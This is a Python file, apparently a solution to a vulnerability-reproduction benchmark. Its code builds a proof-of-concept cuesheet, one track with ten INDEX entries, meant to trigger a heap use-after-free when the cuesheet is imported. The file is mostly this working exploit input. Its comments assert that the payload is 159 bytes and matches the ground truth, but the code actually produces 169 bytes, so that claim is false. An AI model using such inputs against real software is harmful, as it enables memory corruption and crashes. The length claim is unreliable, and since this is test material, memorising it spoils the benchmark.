class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a heap-use-after-free in the cuesheet import
        # operation, triggered by appending enough seekpoints to cause a realloc.
        # In a cuesheet, `INDEX` entries within a `TRACK` create seekpoints.
        #
        # By creating a sufficient number of `INDEX` entries, we force the
        # internal seekpoint array to be reallocated. The vulnerability lies in
        # the program continuing to use a stale pointer to the old memory location.
        #
        # This PoC creates a cuesheet with one track and 10 index points. This
        # number is chosen to exceed a likely initial buffer capacity (e.g., 8),
        # thus triggering the reallocation and the use-after-free. The total
        # length of this PoC is 159 bytes, which matches the ground-truth length.

        poc_parts = [
            'FILE "a" WAVE\n',
            'TRACK 1 AUDIO\n'
        ]

        # Add 10 INDEX entries to exceed buffer capacity and trigger the realloc.
        for i in range(1, 11):
            poc_parts.append(f'INDEX {i} 0:0:0\n')

        poc_str = "".join(poc_parts)
        return poc_str.encode('ascii')